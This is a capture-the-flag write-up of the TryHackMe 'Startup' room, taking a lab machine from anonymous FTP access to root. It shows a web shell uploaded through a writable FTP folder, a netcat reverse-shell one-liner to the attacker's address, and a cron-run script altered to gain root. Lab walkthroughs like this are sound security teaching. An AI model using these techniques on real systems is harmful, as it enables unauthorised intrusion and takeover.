---
title: "StartupSpiceHut_writeup"
date: 2020-11-12T18:46:31-05:00
draft: false
featured: true
toc: true
summary: "We are Spice Hut, a new startup company that just made it big! We ask that you preform a thorough penetration test and try to own root. Good luck!"
images:
  - "img/spiceHut_cover.jpg"
cover: "img/spicehut_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
  - startup
  - spicehut
---

# Startup (Spice Hut) - THM Room

Welcome to another writeup, this time we'll be trying to hack a newly released room on TryHackMe called Startup created by `r1gormort1s`!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/startup).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. 


## Getting initial access

Let's kick off things by running some scans, this time I'll be trying out `RustRecon` tool. If you don't have that already, check it out the repo [here](https://github.com/RustScan/RustScan).


![](https://i.imgur.com/fRHwoDi.png)

This is a very fast tool, and scans are performed(usually) in a matter of seconds.

The results show that we have 3 ports open `21, 22 and 80`.  On port `21` it seems that anonymous access is enabled so let's take a look at that:

### FTP

We connect to the FTP anonymously and see what's there for us:

![](https://i.imgur.com/hpfoiXh.png)

There is a `notice.txt` If we look at that file we get the following:
![](https://i.imgur.com/16BJuph.png)

We get a possible username of `Maya` and a mention that someone if spamming with memes. Let'see if there is anything else there:

![](https://i.imgur.com/enHAEuc.png)


There is also a log file, that just contains the word `test` and an empty `ftp` directory.

Let's move on. 

### Gobuster 

Let's run a `gobuster` and see if it find anything for us:

![](https://i.imgur.com/hBqOgUc.png)

Right away gobuster returns a `/files` directory. Let's check that out in the browser:

![](https://i.imgur.com/eYCLGb6.png)

So we can access the FTP share through that route. Let's see if by any chance the anonymous user can actually upload files there. If that works we could potentially try to upload a file that get us the initial access to the server. Possibly a phpbash file.

Going back to the results returned by `Rustscan` we see there is a mention of that:

![](https://i.imgur.com/tTseohx.png)

So let's figure out how we can exploit this.

If we connect back to the FTP and try to upload the file (I'm trying a phpbash.php) we see that we don't have permissions at the root of the share. However, if we change directory into that empty `ftp` folder we found earlier, we are able to upload our file:

![](https://i.imgur.com/YAFGphe.png)

> NOTE: If you look at the initial transfer, we didn't get back any file transfer size. Turns out I was sending a bad file first it was a corrupted php file. In the second attempt after getting a fresh copy of phpbash it did work fine. Download phpbash [here](https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php)

Let's see if we can access that file from the `/files` route in our browser:

![](https://i.imgur.com/l13lmSB.png)

Well the file is there, let's see if it can actually run:


![](https://i.imgur.com/yFkDcOp.png)



It works! Let's see if we can get that spicy soup recipe now.


## Searching for the holy soup

If we try to browse around with our semi-interactive shell we notice we can't explore beyond the `/var/www` folder:

![](https://i.imgur.com/9vrhTKf.png)

So we need to figure out how to escape this restricted access we have. 

### Stabilizing our shell a bit

Before we do that let's fire up a reverse shell to our machine and try to stabilize the shell so we can work more comfortable.

To do that I first run a `nc -nlvp 2112` (our favorite album and port number :laughing:) then we run the following command in our phpbash: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.34 2112 >/tmp/f`

With that we have a reverse shell, let's try to stabilize it now by running this python line: 
`python -c 'import pty; pty.spawn("/bin/bash")'` and then `export TERM=xterm`

That's it, now we have a somewhat better shell to explore around.

### Running linPEAS.sh

Let's see if linpeas can help us a bit here. In a folder where you have ready `linpeas.sh` let's fire up a local HTTP server with python by running: `sudo python3 -m http.server 80`.
Now let's try to upload that file to the target machine:

![](https://i.imgur.com/eYO8fan.png)

> NOTE: Remember we only have write permissions inside `/var/www/html/files/ftp/` if you try to upload anywhere else you'll get a nice `permission denied`.

Ok that works, now let's make sure we make that file executable by running `chmod +x linpeas.sh` and then we execute it `./linpeash.sh`:

Well that' took a while to run and... it didn't found anything immediately exploitable for us (unless you are not a noob like me and noticed something good there :joy: ). However, it seems to have found an username of `vagrant` and some unexpected folders named `incidents`, `data` and `vagrant`. Another possible interesting piece of info is that we have `/usr/bin/gettext.sh` inside the `PATH` variable.


### Incidents

If we list the files inside the `/incidents` we see there is an interesting file there:

![](https://i.imgur.com/BYuiCuo.png)

If you know this file type, you'll probably know already that we'll have to tinker around with `Wireshark` or a similar program next. So I've already copied that folder to the writable `ftp` folder so we can access it easily and download a copy into our kali box.

![](https://i.imgur.com/OQVaMYl.png)

> *pcapng* file is a standard format for storing captured data. PCAPNG files normally contain several blocks of data. These blocks of data contain different types of information that are useful in. capturing and analyzing network data, such as connection traffic.The blocks may consist of a section header block, interface.


### Wiresharking for the win

Let's open Wireshark with that file and see what we can find. If we start looking at the events captured in the packet, we can see there is an upload of a `shell.php`. Let's follow the trail of that, after inspecting for a while we get to this part where we clearly see the user used python to stabilize his shell and then proceeded to list directories. We also see there is a `recipe.txt`, a username mentioned and even a password and the contents of the `/etc/passwd` file.

![](https://i.imgur.com/Eu9pCDk.png)


If you were able to follow up you'll have a set of credentials for the user `lennie` that we can use to connect to the target machine now.


### Getting the user flag


Let's see if we can switch users now, by doing `su {username_found}` and then entering the password that we got from inspecting that pcapng file.

![](https://i.imgur.com/orpgfUl.png)

Ok so we were able to switch users and retrieve the user flag. But we still need to find that recipe. Let's see if we can do that next. If we navigate to the root of the directory (As we saw the user did on the pcapng file) we know there should be a `recipe.txt` file there. If we see its content we finally get the recipe.

![](https://i.imgur.com/RNabNcU.png)


## Getting root and the last flag

Now we need to see how we can get root, let's run a `sudo -l` and see if this user can access anything as sudo. I'll spare you the test, this user can't run sudo on this server.

Let's re-run linpeas and see if we missed something. When we look at linpeas results carefully, we see some interesting things mentioned:

![](https://i.imgur.com/cO8G57Q.png)

We have an `/etc/print.sh` File, but there are some other things as well:

![](https://i.imgur.com/wEYyGHw.png)

That file has been recently modified and could point us to something interesting. We also see there are some `interesting files` listed which gives us a few others possible ways of gaining root:

![](https://i.imgur.com/VeCbcrD.png)

If we take a look at the files, starting with `startup_list.txt`

![](https://i.imgur.com/4bnTAxO.png)

If we check the file mentioned, it's the same one found by linpeas. All 3 files are somewhat connected. However, the one most interesting is `print.sh` if we can alter that file (that runs with elevated privileges) we can just add a connection to our kali box and if it works, we'll get root. Let's try that.

Run `nano /etc/print.sh` (Reconnect through ssh with lennie's credentials first, otherwise our 'stabilized' terminal will just break when we open nano) and let's add a reverse shell back to our box (remember to start a listener like we did before).

Let's try to get a reverse shell using bash this time:

![](https://i.imgur.com/NVNGSPE.png)

Now let's save the file (CTRL+X then Y and finally ENTER) and see if it works when executed. At this point it is important to make something clear, if we try to run that script directly with our current user, we'll just get another session logged in as lennie. If you noticed before when I listed the interesting files I mentioned that all 3 where connected. 

Planner.sh -> lists startup_list.txt -> print.sh

But if we thing about it, it's quite possible that planner.sh is getting executed by a cronjob every X minutes. Let's see if we get a connection if we wait let's say, five minutes. If we don't, we'll have to find a way to see if there any jobs running that end up running `planner.sh`.

We were right, after just a minute or two we got back a connection as root!

![](https://i.imgur.com/C99cCHo.png)

Now let's get that root flag and go make some dinner, I'm starving :laughing:


![](https://i.imgur.com/e9F4bVm.png)

That's it for this room, I hope you enjoy it as much as I did. Props to `r1gormort1s` for creating it!

Happy hacking!

{{< thm_badge >}}



















